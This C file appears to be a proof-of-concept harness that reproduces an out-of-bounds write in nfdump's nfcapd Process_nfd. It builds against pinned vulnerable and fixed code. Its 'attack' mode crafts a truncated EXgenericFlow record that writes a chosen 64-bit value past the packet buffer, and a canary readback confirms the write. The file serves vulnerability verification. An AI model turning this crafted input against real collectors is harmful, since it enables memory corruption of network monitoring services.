/*
 * nfdump2shell harness — nfcapd Process_nfd truncated EXgenericFlow OOB write.
 *
 * Verbatim pinned code (no edits):
 *   pins/nfxV3.h          src/libnffile/nfxV3.h @ 8a00543a
 *   pins/verify-*.inc     VerifyV3Record @ 8a00543a / 32b9cbe7
 *   pins/process-*.inc    GetExtension+Process_nfd @ 8a00543a,
 *                         ScanExtensions+Process_nfd @ 32b9cbe7
 * Stand-ins: exporter/cache/output-block/stat/metric machinery, Log* macros.
 * Build with -DVULN=1 for parent, -DVULN=0 for the fixed commit.
 */
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>

#define LogError(...)                 \
    do {                              \
        fprintf(stderr, __VA_ARGS__); \
        fprintf(stderr, "\n");        \
    } while (0)
#define LogInfo(...) do { } while (0)
#define dbg_printf(...) do { } while (0)
#define dbg_assert(x) do { } while (0)

static int printRecord = 0; /* module global from pinned nfd_raw.c */

static inline uint64_t ntohll(uint64_t x) {
    return ((uint64_t)ntohl((uint32_t)x) << 32) | (uint64_t)ntohl((uint32_t)(x >> 32));
}

#include "nfxV3.h" /* pinned verbatim */

#define VERSION_NFDUMP 250
#define WRITE_BUFFSIZE 65536

typedef struct nfd_header {
    uint16_t version;
    uint16_t length;
    uint32_t exportTime;
    uint32_t lastSequence;
    uint32_t numRecord;
} nfd_header_t; /* pinned verbatim from src/netflow/nfd_raw.h */

typedef struct exporter_entry_s {
    uint64_t packets;
    uint64_t flows;
} exporter_entry_t;

typedef struct stat_record_s {
    uint64_t numflows_icmp, numpackets_icmp, numbytes_icmp;
    uint64_t numflows_tcp, numpackets_tcp, numbytes_tcp;
    uint64_t numflows_udp, numpackets_udp, numbytes_udp;
    uint64_t numflows_other, numpackets_other, numbytes_other;
    uint64_t numflows, numpackets, numbytes;
} stat_record_t;

typedef struct nffile_s {
    stat_record_t *stat_record;
    void *ident;
} nffile_t;

typedef struct dataBlock_s {
    uint32_t size;
    uint32_t NumRecords;
} dataBlock_t;

typedef struct ipAddr_s {
    unsigned char bytes[16];
} ipAddr_t;

typedef struct FlowSource_s {
    ipAddr_t ipAddr;
    int sa_family;
    struct timeval received;
    exporter_entry_t exporter;
    dataBlock_t *dataBlock;
    nffile_t *nffile;
    uint32_t bad_packets;
} FlowSource_t;

/* pinned verbatim from src/libnffile/nffile.h */
#define GetCurrentCursor(block) ((void *)(block) + (block)->size + sizeof(dataBlock_t))
#define IsAvailable(block, required) (((block)->size + required) < WRITE_BUFFSIZE)

static exporter_entry_t *getExporter(FlowSource_t *fs, nfd_header_t *header) {
    (void)header;
    return &fs->exporter;
}

static dataBlock_t *WriteBlock(nffile_t *nffile, dataBlock_t *block) {
    (void)nffile;
    block->size = 0;
    block->NumRecords = 0;
    return block;
}

static uint32_t MetricExporterID(recordHeaderV3_t *recordHeader) {
    (void)recordHeader;
    return 7;
}

static void UpdateMetric(void *ident, uint32_t exporterIdent, EXgenericFlow_t *genericFlow) {
    (void)ident;
    (void)exporterIdent;
    (void)genericFlow;
}

static void flow_record_short(FILE *out, recordHeaderV3_t *recordHeader) {
    (void)out;
    (void)recordHeader;
}

#if VULN
#include "../pins/verify-parent.inc"
#include "../pins/process-parent.inc"
#else
#include "../pins/verify-fixed.inc"
#include "../pins/process-fixed.inc"
#endif

static void hexdump8(const unsigned char *p) {
    for (int i = 0; i < 8; i++) printf("%02x", p[i]);
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "attack";
    int canary = argc > 2 && strcmp(argv[2], "canary") == 0;

    uint16_t elem_len;
    if (strcmp(mode, "attack") == 0)
        elem_len = (uint16_t)(4 + 16); /* truncated: no msecReceived payload */
    else if (strcmp(mode, "safe-full") == 0)
        elem_len = EXgenericFlowSize; /* complete extension */
    else
        elem_len = 0; /* no elements */

    uint32_t numElements = elem_len ? 1 : 0;
    size_t total = sizeof(nfd_header_t) + sizeof(recordHeaderV3_t) + elem_len;

    /* Exact allocation in ASan builds; a trailing 16-byte canary region in
     * plain builds so the chosen written value can be read back. */
    unsigned char *pkt = malloc(total + (canary ? 16 : 0));
    if (!pkt) return 2;
    memset(pkt, 0x5a, total + (canary ? 16 : 0));
    unsigned char *canary_ptr = pkt + total;

    nfd_header_t *nh = (nfd_header_t *)pkt;
    nh->version = htons(VERSION_NFDUMP);
    nh->length = htons((uint16_t)total);
    nh->exportTime = htonl(1764000000u);
    nh->lastSequence = htonl(1);
    nh->numRecord = htonl(1);

    recordHeaderV3_t *rec = (recordHeaderV3_t *)(pkt + sizeof(nfd_header_t));
    memset(rec, 0, sizeof(*rec));
    rec->type = V3Record;
    rec->size = (uint16_t)(sizeof(recordHeaderV3_t) + elem_len);
    rec->numElements = numElements;
    rec->nfversion = 3;

    if (elem_len) {
        elementHeader_t *eh = (elementHeader_t *)((void *)rec + sizeof(recordHeaderV3_t));
        eh->type = EXgenericFlowID;
        eh->length = elem_len;
        unsigned char *payload = (unsigned char *)eh + sizeof(elementHeader_t);
        memset(payload, 0, elem_len - sizeof(elementHeader_t));
        if (strcmp(mode, "safe-full") == 0) {
            EXgenericFlow_t *gf = (EXgenericFlow_t *)payload;
            gf->proto = IPPROTO_TCP;
            gf->inPackets = 3;
            gf->inBytes = 180;
        } else {
            /* file-chosen bytes in the payload that precedes the truncated field */
            for (unsigned i = 0; i < elem_len - sizeof(elementHeader_t); i++) payload[i] = (unsigned char)(0x41 + i);
        }
    }

    FlowSource_t fs;
    memset(&fs, 0, sizeof(fs));
    fs.sa_family = PF_INET;
    fs.ipAddr.bytes[12] = 127;
    fs.ipAddr.bytes[13] = 0;
    fs.ipAddr.bytes[14] = 0;
    fs.ipAddr.bytes[15] = 1;
    /* chosen 64-bit msecReceived value source, reported below */
    fs.received.tv_sec = 0x54415554; /* "TAUT" */
    fs.received.tv_usec = 123000;

    stat_record_t stats;
    memset(&stats, 0, sizeof(stats));
    nffile_t nffile = {.stat_record = &stats, .ident = NULL};
    dataBlock_t *block = malloc(sizeof(dataBlock_t) + WRITE_BUFFSIZE);
    if (!block) return 2;
    memset(block, 0, sizeof(dataBlock_t) + WRITE_BUFFSIZE);
    fs.dataBlock = block;
    fs.nffile = &nffile;

    printf("MODE=%s VULN=%d VERIFY_ONLY=%d\n", mode, VULN, (int)sizeof(recordHeaderV3_t));
    printf("ELEM_LEN=%u REC_SIZE=%u TOTAL=%zu\n", elem_len, rec->size, total);
    printf("EXGENERICFLOW_SIZE=%u OFF_MSEC_RECEIVED=%zu\n", (unsigned)EXgenericFlowSize, (size_t)__builtin_offsetof(EXgenericFlow_t, msecReceived));
    uint64_t expect = ((uint64_t)fs.received.tv_sec * 1000ULL) + (uint64_t)(fs.received.tv_usec / 1000ULL);
    printf("EXPECTED_MSEC_RECEIVED=%016llx\n", (unsigned long long)expect);
    printf("EXPECTED_BYTES=");
    hexdump8((const unsigned char *)&expect);
    printf("\n");

    VerifyV3Record(rec); /* observable gate result via LogError on rejection */
    Process_nfd(pkt, (ssize_t)total, &fs);

    printf("BLOCK_SIZE=%u NUM_RECORDS=%u FLOWS=%llu\n", block->size, block->NumRecords, (unsigned long long)fs.exporter.flows);
    if (canary) {
        printf("CANARY_AFTER=");
        hexdump8(canary_ptr);
        printf("\n");
    }
    free(pkt);
    free(block);
    return 0;
}
